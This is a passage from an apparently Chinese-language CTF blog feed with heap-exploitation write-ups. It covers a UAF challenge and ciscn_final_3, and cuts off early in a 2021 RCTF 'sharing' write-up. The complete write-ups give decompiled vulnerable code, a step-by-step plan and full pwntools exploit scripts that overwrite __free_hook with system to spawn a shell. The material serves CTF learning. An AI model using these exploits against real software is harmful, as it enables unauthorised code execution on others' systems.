id="0x2-功能分析"><a href="#0x2-功能分析" class="headerlink" title="0x2 功能分析"></a>0x2 功能分析</h2><p>该题功能齐全</p><ul><li>add： 有着16个可用的下标，且分配时会直接覆写原指针，因此我们几乎是可以分配任意个chunk，但是只允许我们分配fastbin size范围的chunk。 <figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs awk">_DWORD *add()<br>&#123;<br>  _DWORD *result; <span class="hljs-regexp">//</span> rax<br>  int idx; <span class="hljs-regexp">//</span> [rsp+<span class="hljs-number">8</span>h] [rbp-<span class="hljs-number">8</span>h]<br>  int size; <span class="hljs-regexp">//</span> [rsp+Ch] [rbp-<span class="hljs-number">4</span>h]<br><br>  puts(<span class="hljs-string">&quot;input index&quot;</span>);<br>  idx = readInt();<br>  <span class="hljs-keyword">if</span> ( idx &lt; <span class="hljs-number">0</span> || idx &gt; <span class="hljs-number">15</span> )<br>  &#123;<br>    puts(<span class="hljs-string">&quot;bye!&quot;</span>);<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);<br>  &#125;<br>  puts(<span class="hljs-string">&quot;input size&quot;</span>);<br>  size = readInt();<br>  <span class="hljs-keyword">if</span> ( size &lt;= <span class="hljs-number">15</span> || size &gt; <span class="hljs-number">96</span> )<br>  &#123;<br>    puts(<span class="hljs-string">&quot;bye!&quot;</span>);<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);<br>  &#125;<br>  pools[idx] = malloc(size);<br>  result = sizes;<br>  sizes[idx] = size;<br>  return result;<br></code></pre></td></tr></table></figure></li><li>edit：该函数根据index定位chunk_addr，然后从<code>chunk_addr+8</code>偏移开始写入内容。因此，我们无法直接进行<code>tcache poisoning</code>，可以考虑<code>chunk overlapping</code>修改fd<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-function"><span class="hljs-type">ssize_t</span> <span class="hljs-title">edit</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [rsp+Ch] [rbp-4h]</span><br><br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;input index&quot;</span>);<br>  v1 = <span class="hljs-built_in">readInt</span>();<br>  <span class="hljs-keyword">if</span> ( v1 &lt; <span class="hljs-number">0</span> || v1 &gt; <span class="hljs-number">15</span> || !pools[v1] )<br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;bye!&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>  &#125;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;input content&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">read</span>(<span class="hljs-number">0</span>, (<span class="hljs-type">void</span> *)(pools[v1] + <span class="hljs-number">8LL</span>), (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)(sizes[v1] - <span class="hljs-number">8</span>));<br>&#125;<br></code></pre></td></tr></table></figure></li><li>show：常规的打印堆块内容</li></ul><figure class="highlight plaintext"><figcaption><span>show()</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs int">&#123;<br>  int v1; // [rsp+Ch] [rbp-4h]<br><br>  puts(&quot;input index&quot;);<br>  v1 = readInt();<br>  if ( v1 &lt; 0 || v1 &gt; 15 || !pools[v1] )<br>  &#123;<br>    puts(&quot;bye!&quot;);<br>    exit(0);<br>  &#125;<br>  return puts((const char *)pools[v1]);<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>delete：根据index释放指定chunk，但是释放后没有将指针置为0，因此存在UAF漏洞</li></ul><figure class="highlight plaintext"><figcaption><span>delete()</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs void">&#123;<br>  int v0; // [rsp+Ch] [rbp-4h]<br><br>  puts(&quot;input index&quot;);<br>  v0 = readInt();<br>  if ( v0 &lt; 0 || v0 &gt; 15 || !pools[v0] )<br>  &#123;<br>    puts(&quot;bye!&quot;);<br>    exit(0);<br>  &#125;<br>  free((void *)pools[v0]);                      // UAF<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>leaveYouName：创建0x400字节（large bin）的堆块来存储name,然后输入0x100字节大小的name。</li></ul><figure class="highlight plaintext"><figcaption><span>*leaveYouName()</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs char">&#123;<br>  char *result; // rax<br><br>  result = name;<br>  if ( !name )<br>  &#123;<br>    name = (char *)malloc(0x400uLL);            // 申请large bin 执行 malloc_consolidate 合并<br>    puts(&quot;your name:&quot;);<br>    result = (char *)read(0, name, 0x100uLL);<br>  &#125;<br>  return result;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>showYourName：使用<code>puts</code>函数打印出name</li></ul><h2 id="0x3-利用思路"><a href="#0x3-利用思路" class="headerlink" title="0x3 利用思路"></a>0x3 利用思路</h2><ol><li>首先，由于保护全开，因此无法通过修改plt表或者got表来getshell，所以我们需要先获取libc基址；</li><li>由于无法申请非fastbin范围的的堆块，所以无法直接通过<code>unsorted bin</code>的方式获取libcbase。因此需要通过申请<code>large bin</code>触发执行<code>malloc_consolidate</code>函数将 fastbin 中的堆块进行合并，并放到<code>unsorted bin</code>中。所以首先申请大量相同大小的堆块，然后释放一部分，让对应tcache填满，对应的fastbin中也有堆块；</li><li>然后申请<code>large bin</code>，将fastbin中的的堆块合并（此时它们都是物理相邻的）。再通过UAF或者脏数据的形式获取<code>main_arena + offset</code>，从而获取libcbase；</li><li>之后再次申请<code>unsorted bin</code>中的空闲堆块，从而实现<code>chunk overlapping</code>（idx1与idx2指向的堆块有重叠部分），即可释放idx1，利用idx2修改idx1的fd即可实现<code>tcache poisoning</code>，从而修改<code>__free_hook</code>。</li></ol><h2 id="0x4-Exp"><a href="#0x4-Exp" class="headerlink" title="0x4 Exp"></a>0x4 Exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-comment"># -*- encoding: utf-8 -*-</span><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">@文件        :exp.py</span><br><span class="hljs-string">@说明        :存在UAF，但是无法写chunk的fd，因此不能造成任意写漏洞</span><br><span class="hljs-string">假如 malloc 的 size 大于 small bin 的范围，先调用 malloc_consolidate 将 fastbin 合并为 unsorted bin</span><br><span class="hljs-string">@时间        :2021/09/13 15:54:14</span><br><span class="hljs-string">@作者        :sh0ve1</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> pwnlib<br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.os = <span class="hljs-string">&#x27;linux&#x27;</span><br><br>REMOTE = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> REMOTE:<br>    <span class="hljs-keyword">pass</span><br><span class="hljs-keyword">else</span>:<br>    p = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>    libc = ELF(<span class="hljs-string">&#x27;./bc.so.6&#x27;</span>) <span class="hljs-comment">#libc-2.27.so</span><br><br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">index,size</span>):<br>p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;input index&#x27;</span>,<span class="hljs-built_in">str</span>(index))<br>p.sendlineafter(<span class="hljs-string">&#x27;input size&#x27;</span>,<span class="hljs-built_in">str</span>(size))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;input index&#x27;</span>,<span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index,content</span>):<br>p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;input index&#x27;</span>,<span class="hljs-built_in">str</span>(index))<br>p.sendafter(<span class="hljs-string">&#x27;input content&#x27;</span>,content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;input index\n&#x27;</span>,<span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">leave_name</span>(<span class="hljs-params">name</span>):<br>p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>,<span class="hljs-string">&#x27;5&#x27;</span>)<br>p.sendafter(<span class="hljs-string">&#x27;your name:&#x27;</span>,name)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show_name</span>():<br>p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>,<span class="hljs-string">&#x27;6&#x27;</span>)<br><br><span class="hljs-comment"># 申请大量堆块，用于填满tcache，放到fastbin</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):<br>    add(i,<span class="hljs-number">0x60</span>)<br><br><span class="hljs-comment"># 填满tcache,然后放在fastbin</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">15</span>):<br>    delete(i)<br><br>leave_name(<span class="hljs-string">&#x27;AAAAAAAA&#x27;</span>) <span class="hljs-comment">#触发fastbin合并，然后放到unsorted bin idx:7~15</span><br><br>add(<span class="hljs-number">0</span>,<span class="hljs-number">0x18</span>) <span class="hljs-comment">#从idx=7中分割0x20(chunk1)</span><br>show(<span class="hljs-number">0</span>)<br>libcbase = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x3ec010</span><br>__free_hook = libcbase + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>system = libcbase + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>log.info(<span class="hljs-string">&#x27;libcbase:&#x27;</span> + <span class="hljs-built_in">hex</span>(libcbase))<br>log.info(<span class="hljs-string">&#x27;__free_hook:&#x27;</span> + <span class="hljs-built_in">hex</span>(__free_hook))<br><br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x18</span>) <span class="hljs-comment">#从idx=7中分割0x20(chunk2)</span><br>delete(<span class="hljs-number">1</span>) <span class="hljs-comment"># 将idx=1放入tcache</span><br>edit(<span class="hljs-number">7</span>,<span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">0x10</span>+p64(<span class="hljs-number">0x21</span>) + p64(__free_hook - <span class="hljs-number">0x8</span>)) <span class="hljs-comment">#堆重叠 tcache的fd不会检查size，减8是因为edit函数是从第8字节开始写 修改idx=1的fd</span><br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x18</span>) <span class="hljs-comment">#chunk2</span><br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0x18</span>) <span class="hljs-comment">#类似double free, idx=2代表的是free_hook附近的内存块</span><br><span class="hljs-comment"># pwnlib.gdb.attach(p)</span><br>edit(<span class="hljs-number">2</span>,p64(system))<br>edit(<span class="hljs-number">7</span>,<span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">0x10</span>+p64(<span class="hljs-number">0x21</span>) + <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)<br>delete(<span class="hljs-number">1</span>)<br><br><span class="hljs-comment"># pwnlib.gdb.attach(p)</span><br>p.interactive()<br>p.close()<br><br></code></pre></td></tr></table></figure><h2 id="0x4-Reference"><a href="#0x4-Reference" class="headerlink" title="0x4 Reference"></a>0x4 Reference</h2><ul><li><a href="https://blog.csdn.net/qq_37422196/article/details/112790718">https://blog.csdn.net/qq_37422196/article/details/112790718</a></li><li><a href="https://blog.csdn.net/liucc09/article/details/112784015?utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~default-1.no_search_link&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~default-1.no_search_link">https://blog.csdn.net/liucc09/article/details/112784015?utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7Edefault-1.no_search_link&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7Edefault-1.no_search_link</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>CTF-WriteUp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>heap</tag>
      
      <tag>tcache poisoning</tag>
      
      <tag>chunk overlapping</tag>
      
      <tag>UAF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ciscn_final_3</title>
    <link href="/2021/11/03/ciscn-final-3/"/>
    <url>/2021/11/03/ciscn-final-3/</url>
    
    <content type="html"><![CDATA[<h2 id="0x0-前言"><a href="#0x0-前言" class="headerlink" title="0x0 前言"></a>0x0 前言</h2><p>题不难，主要是想利用这道题捋一下做题的思路</p><h2 id="0x1-题目信息"><a href="#0x1-题目信息" class="headerlink" title="0x1 题目信息"></a>0x1 题目信息</h2><ul><li>采用libc-2.27.so（2.27-3ubuntu1_amd64，无tcache double free 检测）</li><li><code>file ciscn_final_3</code></li></ul><figure class="highlight apache"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ciscn_final_3</span>: ELF <span class="hljs-number">64</span>-bit LSB shared object, x86-<span class="hljs-number">64</span>, version <span class="hljs-number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-<span class="hljs-number">64</span>.so.<span class="hljs-number">2</span>, for GNU/Linux <span class="hljs-number">3</span>.<span class="hljs-number">2</span>.<span class="hljs-number">0</span>, BuildID[sha1]=f8bdde8087e91d876f0b01a4767be59e42885a1e, stripped<br></code></pre></td></tr></table></figure><ul><li><code>checksec ciscn_final_3</code> 保护全开<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">Arch:</span>     amd64<span class="hljs-number">-64</span>-little<br><span class="hljs-symbol">   RELRO:</span>    Full RELRO<br><span class="hljs-symbol">   Stack:</span>    Canary found<br><span class="hljs-symbol">   NX:</span>       NX enabled<br><span class="hljs-symbol">   PIE:</span>      PIE enabled<br><br></code></pre></td></tr></table></figure></li></ul><h2 id="0x2-功能分析"><a href="#0x2-功能分析" class="headerlink" title="0x2 功能分析"></a>0x2 功能分析</h2><p>该题就只有两个功能：add和remove</p><ul><li>add: 只能申请小于0x78大小的chunk，最多只能申请24次，并且申请成功之后会打印出申请到内存空间的地址。</li><li>remove:简单地根据指定地index确定被释放地chunk，但是指针没有被置零，存在UAF漏洞</li></ul><h2 id="0x3-利用思路"><a href="#0x3-利用思路" class="headerlink" title="0x3 利用思路"></a>0x3 利用思路</h2><ul><li>首先申请一个堆块获取到堆地址；</li><li>由于该题唯一地输出只有申请成功之后chunk地址，因此可以考虑申请一个在libc中的chunk，但是常规的申请是不可能的。所以我们可以考虑利用UAF修改被释放的堆块的fd为libc中的地址；</li><li>但是这个libc中地址如何得到是一个问题？当释放一个非fastbin的堆块时，会先放到unsorted bin这个双链表中，fd和bk也会被设置为<code>main_arena+offset</code>，这样我们就在已知地址的地方有libc地址，我们只需要在一个tcache bin[idx] 链表中的任意一个堆块的fd置为已知地址即可申请到libc中的堆块；</li><li>最大只能申请0x78,那如何释放一个非fastbin大小范围的chunk呢？唯一一个大于0x90的chunk就是<code>tcache struct</code>，因此可以利用<code>UAF + double free</code>控制它，，然后free即可；</li><li>得到libc基址之后，需要申请<code>__free_hook</code>附近的chunk来修改它为<code>system</code>，因此需要修改<code>tcache struct</code>。此时由于脏数据，<code>tcache struct</code>的fastbin范围的chunk的count很乱，所以不建议像上面那样控制<code>tcache struct</code>。此时，unsorted bin中指向的就是<code>tcache struct</code>，所以我们可以考虑申请一个空的<code>tcache bin</code>链表对应size的chunk，从而获取<code>tcache struct</code>的写权限。修改一个指针为<code>__free_hook</code>即可；</li><li>修改<code>__free_hook</code>之后就申请一个chunk，内容为<code>/bin/sh\x00</code>，然后释放即可getshell。</li></ul><h2 id="0x4-Exp"><a href="#0x4-Exp" class="headerlink" title="0x4 Exp"></a>0x4 Exp</h2><figure class="highlight plaintext"><figcaption><span>python3</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><code class="hljs #!/usr/bin/env"># -*- encoding: utf-8 -*-<br><br>&#x27;&#x27;&#x27;<br>@文件        :exp.py<br>@说明        :UAF + tcache poisoning<br>@时间        :2021/11/03 11:17:59<br>@作者        :sh0ve1<br>&#x27;&#x27;&#x27;<br><br>from pwn import *<br>import pwnlib<br><br>context.log_level = &#x27;debug&#x27;<br>context.arch = &#x27;amd64&#x27;<br>context.os = &#x27;linux&#x27;<br><br>REMOTE = 0<br>if REMOTE:<br>    p = remote(&#x27;node4.buuoj.cn&#x27;,27050)<br>    libc = ELF(&#x27;./libc.so.6&#x27;)<br>else:<br>    p = process(&#x27;./ciscn_final_3&#x27;)<br>    libc = ELF(&#x27;./libc.so.6&#x27;)<br><br>def add(index:int,size:int , content):<br>    p.recvuntil(b&quot;choice &gt; &quot;)<br>    p.sendline(&#x27;1&#x27;)<br>    p.recvuntil(b&quot;input the index&quot;)<br>    p.sendline(str(index))<br>    p.recvuntil(b&quot;input the size&quot;)<br>    p.sendline(str(size))<br>    p.recvuntil(b&quot;now you can write something&quot;)<br>    p.send(content)<br><br>def free(index:int):<br>    p.recvuntil(b&quot;choice &gt; &quot;)<br>    p.sendline(&#x27;2&#x27;)<br>    p.recvuntil(b&quot;input the index&quot;)<br>    p.sendline(str(index))<br><br>add(0,0x60,b&#x27;A&#x27;*0x60)<br>p.recvuntil(&#x27;0x&#x27;)<br>heapbase = int(p.recv(12),16) - 0x11e70<br>log.success(&quot;heapbase: &quot; + hex(heapbase))<br>add(1,0x10,b&#x27;GAP!&#x27;*0x4)<br><br># tcache poisoning to control tcache struct<br>free(0)<br>free(0)<br>add(2,0x60,p64(heapbase + 0x10) + b&#x27;\n&#x27;)<br>add(3,0x60,b&#x27;B&#x27;*0x60)<br># modify tcache struct to make the strcut(chunk_size=0x250) be freed to unsorted bin <br># set tcache bin[0~3]=tcache struct<br>add(4,0x60,(b&#x27;\x00&#x27;*35 + b&#x27;\x07&#x27;).ljust(0x40,b&#x27;\x00&#x27;) + p64(heapbase + 0x10)*4)<br># free tcache struct to unsorted bin, fd == bk == main_arena + 96<br>free(4)<br># tcache bin[0~3]: tcache struct --&gt; main_arena + 96<br>add(5,0x20,&#x27;C\n&#x27;) # 申请 tcache struct<br>add(6,0x20,&#x27;D\n&#x27;) # 申请 main_arena + 96 来获取 libcbase<br><br>p.recvuntil(&#x27;0x&#x27;)<br>libcbase = int(p.recv(12),16) - 0x3ebca0<br>log.success(&quot;libcbase: &quot; + hex(libcbase))<br><br># 从unsorted bin中重新获取tcache struct,并且修改tcache bin[0]的指针和计数器<br>add(7,0x60,b&#x27;\x00&#x27;*0x40 + p64(libcbase + libc.sym[&#x27;__free_hook&#x27;]) + p64(0)*3) <br>add(8,0x10,p64(libcbase + libc.sym[&#x27;system&#x27;]) + b&#x27;\n&#x27;)<br>free(5)<br><br>add(9,0x10,&#x27;/bin/sh\x00\n&#x27;)<br>free(9)<br><br># pwnlib.gdb.attach(p)<br>p.interactive()<br>p.close()<br><br></code></pre></td></tr></table></figure><h2 id="0x5-Reference"><a href="#0x5-Reference" class="headerlink" title="0x5 Reference"></a>0x5 Reference</h2><ul><li><a href="https://arttnba3.cn/2021/05/10/NOTE-0X04-GLIBC_HEAP-EXPLOIT/#%E4%BE%8B%E9%A2%982%EF%BC%88fastbin-double-free%EF%BC%89%EF%BC%9Aciscn-2019-final-3">https://arttnba3.cn/2021/05/10/NOTE-0X04-GLIBC_HEAP-EXPLOIT/#%E4%BE%8B%E9%A2%982%EF%BC%88fastbin-double-free%EF%BC%89%EF%BC%9Aciscn-2019-final-3</a></li><li><a href="https://blog.csdn.net/github_36788573/article/details/103599951">https://blog.csdn.net/github_36788573/article/details/103599951</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>CTF-WriteUp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>heap</tag>
      
      <tag>tcache poisoning</tag>
      
      <tag>UAF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2021RCTF-sharing</title>
    <link href="/2021/10/02/2021RCTF-sharing/"/>
    <url>/2021/10/02/2021RCTF-sharing/</url>
    
    <content type="html"><![CDATA[<h2 id="0x0-前言"><a href="#0x0-前言" class="headerlink" title="0x0 前言"></a>0x0 前言</h2><p>赛后复现<code>2021 RCTF</code>中的sharing。</p><h2 id="0x1-功能分析"><a href="#0x1-功能分析" class="headerlink" title="0x1 功能分析"></a>0x1 功能分析</h2><ul><li>add：输入index和size，其中对index进行了检查（不能47）</li><li>edit：输入index和content，不对index进行检查，根据一个全局指针变量<code>ptr</code>来定位要写的堆块地址（<code>*(*(ptr + index * 0x10）+ 8)</code>)和要写入的大小size（<code>*(ptr + index * 0x10）</code>）,如果<code>size</code>不为0就进行写操作</li><li>show：输入index，不检查index，根据一个全局指针变量<code>ptr</code>来定位要写的堆块地址（<code>*(*(ptr + index * 0x10）+ 8)</code>)，如果<code>size</code>不为0就进行读操作。</li><li>move：依次输入index1和index2，在heap manager中，用index1的指针的值替换index2的指针的值，同时<code>free</code>掉index2代表的堆块。</li><li>减2：choice输入57005，先输入满足条件的hint（字符串长度为0x10字节，每4个字节的值相加等于0x2F767991），然后输入任意地址addr，可以将该地址处的值减2。（没用上就没仔细分析）</li></ul><p><img src="https://raw.githubusercontent.com/sh0ve1/Images/master/pwn/struct.png" alt="image"></p><h2 id="0x2-利用思路"><a href="#0x2-利用思路" class="headerlink" title="0x2 利用思路"></a>0x2 利用思路</h2><ol><li>申请大的chunk，使其被释放时不会放到<code>tcache</code>，而是放到<code>unsorted bin</code>，然后再次申请它，利用脏数据泄露<code>libc</code>地址；</li><li>释放两个相同大小的chunk到tcache中，然后再申请后释放的chunk，从而利用脏数据得到第一次释放的chunk的地址，即堆地址；</li><li>利用没用对<code>idx</code>的检查，在申请的堆块中伪造管理堆块和指针数组，然后写<code>__free_hook</code>为<code>system</code>,从而通过释放堆块getshell。</li></ol><h2 id="0x3-Exp"><a href="#0x3-Exp" class="headerlink" title="0x3 Exp"></a>0x3 Exp</h2><figure class="highlight routeros"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span 